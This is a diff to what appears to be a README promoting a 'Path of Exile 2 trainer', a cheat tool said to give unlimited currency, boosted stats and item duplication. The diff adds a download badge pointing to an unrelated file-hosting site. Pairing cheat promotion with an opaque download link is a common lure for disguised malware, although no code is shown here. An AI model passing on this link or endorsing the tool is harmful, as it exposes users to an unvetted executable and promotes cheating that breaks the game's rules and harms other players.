@@ -1,5 +1,7 @@
 Path of Exile 2 trainer is a third-party cheat tool designed to alter or enhance gameplay by giving players unfair advantages. Trainers typically provide features like unlimited resources, enhanced stats, item duplication, faster leveling, or even invincibility, allowing players to bypass the normal progression systems of the game. These trainers can be used to manipulate various aspects of the game, making it easier to farm items, gain currency, or level up quickly without putting in the usual effort.
 
+[![Download PoE 2 Trainer](https://img.shields.io/badge/Download-PoE2Trainer%20-blueviolet)](https://downeefiles.com/s/pe2tr)
+
 ### Key Features:
 - **Unlimited Resources**: Trainers can provide infinite currency, crafting materials, or other in-game resources, eliminating the need for farming or trading.
 - **Enhanced Stats**: Some trainers modify player stats, such as increasing health, damage, or defense, allowing players to become much stronger than intended.
